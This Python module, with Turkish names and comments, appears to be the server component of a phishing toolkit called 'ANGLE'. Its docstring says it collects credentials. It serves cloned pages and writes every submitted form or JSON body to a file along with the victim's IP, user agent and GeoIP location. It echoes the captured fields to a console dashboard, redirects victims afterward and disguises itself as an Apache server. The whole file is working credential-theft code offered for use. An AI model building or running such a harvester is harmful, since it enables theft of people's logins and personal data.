#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
kimlik bilgisi toplamak için kullanılan gelişmiş HTTP sunucu.

özellikler:
    - thread-safe dosya yazma (lock mekanizması)
    - graceful shutdown desteği
    - tam MIME türü tespiti
    - path traversal koruması
    - IP bazlı rate limiting
    - istek istatistikleri
    - HTTPS desteği (opsiyonel)
"""

from __future__ import annotations

import http.server
import mimetypes
import os
import signal
import threading
import time
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Optional, Type
from urllib.parse import parse_qs, unquote, urlparse

from .konsol import konsol
from .yardimci import guvenli_yol_birlestir


# ────────────────────────────── istatistik sayacı ──────────────────────────────

class SunucuIstatistik:
    """thread-safe sunucu istatistik takibi."""

    def __init__(self) -> None:
        self._kilit = threading.Lock()
        self.toplam_get: int = 0
        self.toplam_post: int = 0
        self.toplanan_kimlik: int = 0
        self.baslangic_zamani: float = time.time()
        self.istek_ipleri: dict[str, int] = defaultdict(int)

    def get_ekle(self, ip: str) -> None:
        with self._kilit:
            self.toplam_get += 1
            self.istek_ipleri[ip] += 1

    def post_ekle(self, ip: str) -> None:
        with self._kilit:
            self.toplam_post += 1
            self.toplanan_kimlik += 1
            self.istek_ipleri[ip] += 1

    @property
    def calisma_suresi(self) -> str:
        """sunucunun çalışma süresini okunabilir formatta döndürür."""
        gecen = int(time.time() - self.baslangic_zamani)
        saat, kalan = divmod(gecen, 3600)
        dakika, saniye = divmod(kalan, 60)
        return f"{saat:02d}:{dakika:02d}:{saniye:02d}"

    def ozet(self) -> dict[str, Any]:
        """istatistik özetini sözlük olarak döndürür."""
        with self._kilit:
            return {
                "toplam_get": self.toplam_get,
                "toplam_post": self.toplam_post,
                "toplanan_kimlik": self.toplanan_kimlik,
                "calisma_suresi": self.calisma_suresi,
                "benzersiz_ip": len(self.istek_ipleri),
            }


# ────────────────────────────── rate limiter ──────────────────────────────

class RateLimiter:
    """IP bazlı basit rate limiter.

    Args:
        maks_istek: pencere başına maksimum istek sayısı
        pencere_saniye: zaman penceresi (saniye)
    """

    def __init__(self, maks_istek: int = 60, pencere_saniye: int = 60) -> None:
        self._kilit = threading.Lock()
        self._maks_istek = maks_istek
        self._pencere = pencere_saniye
        self._istekler: dict[str, list[float]] = defaultdict(list)

    def izin_var_mi(self, ip: str) -> bool:
        """verilen IP'nin istek yapmasına izin verilip verilmediğini kontrol eder.

        Args:
            ip: kontrol edilecek IP adresi

        Returns:
            True ise istek yapılabilir
        """
        simdi = time.time()
        with self._kilit:
            # eski istekleri temizle
            self._istekler[ip] = [
                t for t in self._istekler[ip]
                if simdi - t < self._pencere
            ]
            if len(self._istekler[ip]) >= self._maks_istek:
                return False
            self._istekler[ip].append(simdi)
            return True


# ────────────────────────────── HTTP istek işleyici ──────────────────────────────

class DinleyiciSunucu(http.server.BaseHTTPRequestHandler):
    """gelişmiş HTTP istek işleyici — gelen POST isteklerini kaydeder.

    sınıf değişkenleri, sunucu başlatılmadan önce dışarıdan atanır:
        - kayit_dosyasi: kimlik bilgilerinin yazılacağı dosya
        - yonlendirme_url: POST sonrası yönlendirme adresi
        - sunucu_kok_dizini: statik dosyaların kök dizini
        - istatistik: SunucuIstatistik nesnesi
        - rate_limiter: RateLimiter nesnesi
        - dosya_kilidi: threading.Lock nesnesi
    """

    # sınıf değişkenleri — dışarıdan atanır
    kayit_dosyasi: str = "toplanan_kimlikler.txt"
    yonlendirme_url: Optional[str] = None
    sunucu_kok_dizini: Optional[str] = None
    istatistik: Optional[SunucuIstatistik] = None
    rate_limiter: Optional[RateLimiter] = None
    dosya_kilidi: Optional[threading.Lock] = None

    # sunucu kimlik başlığı
    server_version = "Apache/2.4.41"
    sys_version = ""

    def _rate_kontrol(self) -> bool:
        """rate limit kontrolü yapar, aşılmışsa 429 döner."""
        if self.rate_limiter and not self.rate_limiter.izin_var_mi(self.client_address[0]):
            self.send_response(429)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Retry-After", "60")
            self.end_headers()
            self.wfile.write(b"<html><body><h3>cok fazla istek</h3></body></html>")
            konsol.uyari(f"rate limit aşıldı: {self.client_address[0]}")
            return False
        return True

    def do_POST(self) -> None:
        """POST ile gelen verileri thread-safe olarak dosyaya yazar."""
        if not self._rate_kontrol():
            return

        ip = self.client_address[0]
        kullanici_ajani = self.headers.get("User-Agent", "bilinmiyor")

        try:
            icerik_uzunlugu = int(self.headers.get("Content-Length", 0))
            # maksimum 1MB veri kabul et
            if icerik_uzunlugu > 1_048_576:
                self.send_error(413, "istek gövdesi çok büyük")
                return
            ham_veri = self.rfile.read(icerik_uzunlugu).decode("utf-8", errors="replace")
        except (ValueError, OSError) as e:
            konsol.hata(f"POST verisi okunamadı ({ip}): {e}")
            self.send_error(400, "Bad Request")
            return

        zaman = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

        # form veya json verisini ayrıştır
        ayristirilmis: dict[str, str] = {}
        if ham_veri.startswith("{") and ham_veri.endswith("}"):
            import json
            try:
                j_veri = json.loads(ham_veri)
                if isinstance(j_veri, dict):
                    ayristirilmis = {str(k): str(v) for k, v in j_veri.items()}
            except Exception:
                pass
        if not ayristirilmis and "=" in ham_veri:
            p_veri = parse_qs(ham_veri)
            for k, v in p_veri.items():
                ayristirilmis[k] = ", ".join(v)

        from .yardimci import geoip_bilgisi_al
        geo = geoip_bilgisi_al(ip)
        geo_str = f"{geo['ulke']} / {geo['sehir']} ({geo['isp']})"

        # thread-safe dosya yazma
        kilit = self.dosya_kilidi or threading.Lock()
        with kilit:
            try:
                with open(self.kayit_dosyasi, "a", encoding="utf-8") as dosya:
                    dosya.write(f"\n{'='*60}\n")
                    dosya.write(f"[{zaman}] IP: {ip} [{geo_str}]\n")
                    dosya.write(f"User-Agent: {kullanici_ajani}\n")
                    dosya.write(f"Yol: {self.path}\n")
                    dosya.write(f"{'─'*60}\n")
                    dosya.write(ham_veri + "\n")
                    dosya.write(f"{'='*60}\n")
            except OSError as e:
                konsol.hata(f"kayıt dosyasına yazılamadı: {e}")

        # istatistik güncelle
        if self.istatistik:
            self.istatistik.post_ekle(ip)

        konsol.basari(f"kimlik bilgisi yakalandı: {ip} ({geo['ulke']})")
        if ayristirilmis:
            for alan, deger in ayristirilmis.items():
                konsol.vurgu(f"   > {alan}: {deger}")
        else:
            konsol.soluk(f"   > ham veri: {ham_veri[:100]}")
        konsol.soluk(f"konum: {geo_str}")
        konsol.soluk(f"veriler → {self.kayit_dosyasi}")

        # yönlendirme veya basit yanıt
        if self.yonlendirme_url:
            self.send_response(302)
            self.send_header("Location", self.yonlendirme_url)
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(
                b"<html><body><h3>islem tamamlandi</h3>"
                b"<p>yonlendiriliyorsunuz...</p></body></html>"
            )

    def do_GET(self) -> None:
        """statik dosyaları güvenli şekilde sunar."""
        if not self._rate_kontrol():
            return

        if self.sunucu_kok_dizini is None:
            self.send_error(404, "Not Found")
            return

        # istatistik güncelle
        if self.istatistik:
            self.istatistik.get_ekle(self.client_address[0])

        # URL decode, query string temizleme ve varsayılan dosya
        cozulu_url = urlparse(self.path)
        yol = unquote(cozulu_url.path.lstrip("/"))
        if yol == "" or yol.endswith("/"):
            yol = yol + "index.html"

        # path traversal koruması
        guvenli_yol = guvenli_yol_birlestir(self.sunucu_kok_dizini, yol)
        if guvenli_yol is None:
            self.send_error(403, "Forbidden")
            return

        if not os.path.isfile(guvenli_yol):
            self.send_error(404, "Not Found")
            return

        try:
            with open(guvenli_yol, "rb") as f:
                icerik = f.read()
        except OSError:
            self.send_error(500, "Internal Server Error")
            return

        # MIME türü tespiti
        mime_turu, _ = mimetypes.guess_type(guvenli_yol)
        if mime_turu is None:
            mime_turu = "application/octet-stream"

        self.send_response(200)
        self.send_header("Content-Type", mime_turu)
        self.send_header("Content-Length", str(len(icerik)))
        # güvenlik başlıkları
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.end_headers()
        self.wfile.write(icerik)

    def log_message(self, format: str, *args: Any) -> None:
        """varsayılan günlük çıktısını bastırır — kendi loglamamızı kullanıyoruz."""
        pass


# ────────────────────────────── sunucu yönetimi ──────────────────────────────

class SunucuYonetici:
    """HTTP sunucusunun yaşam döngüsünü yöneten sınıf.

    graceful shutdown, istatistik ve HTTPS desteği sağlar.

    Args:
        port: dinlenecek port
        host: dinlenecek host (varsayılan "0.0.0.0")
        isleyici_sinifi: HTTP istek işleyici sınıfı
        ssl_baglami: opsiyonel SSL bağlamı (HTTPS için)
        rate_limit: dakikadaki maksimum istek sayısı
        **isleyici_kwargs: isleyici sınıfına atanacak sınıf değişkenleri
    """

    def __init__(
        self,
        port: int,
        host: str = "0.0.0.0",
        isleyici_sinifi: Type[DinleyiciSunucu] = DinleyiciSunucu,
        ssl_baglami: Any = None,
        rate_limit: int = 60,
        **isleyici_kwargs: Any,
    ) -> None:
        self.port = port
        self.host = host
        self.ssl_baglami = ssl_baglami
        self.istatistik = SunucuIstatistik()
        self.rate_limiter = RateLimiter(maks_istek=rate_limit)
        self._dosya_kilidi = threading.Lock()
        self._sunucu: Optional[http.server.HTTPServer] = None
        self._is_parcacigi: Optional[threading.Thread] = None
        self._calisiyor = False

        # dinamik sınıf oluştur
        isleyici_kwargs.update({
            "istatistik": self.istatistik,
            "rate_limiter": self.rate_limiter,
            "dosya_kilidi": self._dosya_kilidi,
        })
        self._isleyici_sinifi = type(
            f"OzelDinleyici_{port}",
            (isleyici_sinifi,),
            isleyici_kwargs,
        )

    def baslat(self, arka_plan: bool = True) -> None:
        """sunucuyu başlatır.

        Args:
            arka_plan: True ise arka plan thread'inde çalışır
        """
        sunucu_adresi = (self.host, self.port)
        self._sunucu = http.server.HTTPServer(sunucu_adresi, self._isleyici_sinifi)

        if self.ssl_baglami:
            self._sunucu.socket = self.ssl_baglami.wrap_socket(
                self._sunucu.socket, server_side=True
            )
            protokol = "https"
        else:
            protokol = "http"

        self._calisiyor = True
        konsol.basari(f"sunucu {protokol}://0.0.0.0:{self.port} adresinde başlatıldı")

        if arka_plan:
            self._is_parcacigi = threading.Thread(
                target=self._sunucu.serve_forever,
                daemon=True,
            )
            self._is_parcacigi.start()
        else:
            self._sunucu.serve_forever()

    def durdur(self) -> None:
        """sunucuyu graceful olarak durdurur."""
        if self._sunucu and self._calisiyor:
            self._calisiyor = False
            self._sunucu.shutdown()
            self._sunucu.server_close()
            konsol.bilgi("sunucu düzgün şekilde durduruldu.")

            # son istatistikleri göster
            ozet = self.istatistik.ozet()
            konsol.ayirici()
            konsol.bilgi(f"çalışma süresi: {ozet['calisma_suresi']}")
            konsol.bilgi(f"toplam GET: {ozet['toplam_get']}, toplam POST: {ozet['toplam_post']}")
            konsol.bilgi(f"toplanan kimlik: {ozet['toplanan_kimlik']}")
            konsol.bilgi(f"benzersiz IP: {ozet['benzersiz_ip']}")
            konsol.ayirici()

    def canli_panel_olustur(self) -> Any:
        """rich Panel/Layout formatında canlı dashboard paneli döndürür."""
        from rich.layout import Layout
        from rich.panel import Panel
        from rich.table import Table

        ozet = self.istatistik.ozet()

        tablo = Table(show_header=True, header_style="bold bright_cyan", border_style="dim", expand=True)
        tablo.add_column("Metrik", style="bold white")
        tablo.add_column("Değer", style="bold green")

        tablo.add_row("Çalışma Süresi", str(ozet.get("calisma_suresi", "00:00:00")))
        tablo.add_row("Toplam GET İstek", str(ozet.get("toplam_get", 0)))
        tablo.add_row("Toplam POST İstek", str(ozet.get("toplam_post", 0)))
        tablo.add_row("Yakalanan Kimlik", str(ozet.get("toplanan_kimlik", 0)))
        tablo.add_row("Benzersiz IP", str(ozet.get("benzersiz_ip", 0)))

        return Panel(
            tablo,
            title="[bold bright_cyan]ANGLE — Canlı Sunucu Paneli[/bold bright_cyan]",
            subtitle="[soluk][s] İstatistik | [l] Son Veriler | [r] Rapor Al | [q] Durdur[/soluk]",
            border_style="bright_blue",
            padding=(1, 2),
        )

    def istatistik_goster(self) -> None:
        """anlık istatistikleri konsola yazar."""
        ozet = self.istatistik.ozet()
        try:
            tablo = konsol.tablo_olustur("sunucu istatistikleri", ["metrik", "değer"])
            for anahtar, deger in ozet.items():
                tablo.add_row(anahtar, str(deger))
            konsol.tablo_yazdir(tablo)
        except RuntimeError:
            # rich yoksa basit çıktı
            for anahtar, deger in ozet.items():
                konsol.bilgi(f"{anahtar}: {deger}")


# ────────────────────────────── geriye dönük uyumluluk ──────────────────────────────

def sunucu_baslat(port: int, isleyici_sinifi: Type[DinleyiciSunucu], **isleyici_kwargs: Any) -> None:
    """eski API ile uyumluluk için wrapper fonksiyon.

    yeni kod SunucuYonetici sınıfını doğrudan kullanmalıdır.

    Args:
        port: dinlenecek port
        isleyici_sinifi: HTTP istek işleyici sınıfı
        **isleyici_kwargs: isleyici sınıfına atanacak değişkenler
    """
    yonetici = SunucuYonetici(port=port, isleyici_sinifi=isleyici_sinifi, **isleyici_kwargs)
    yonetici.baslat(arka_plan=False)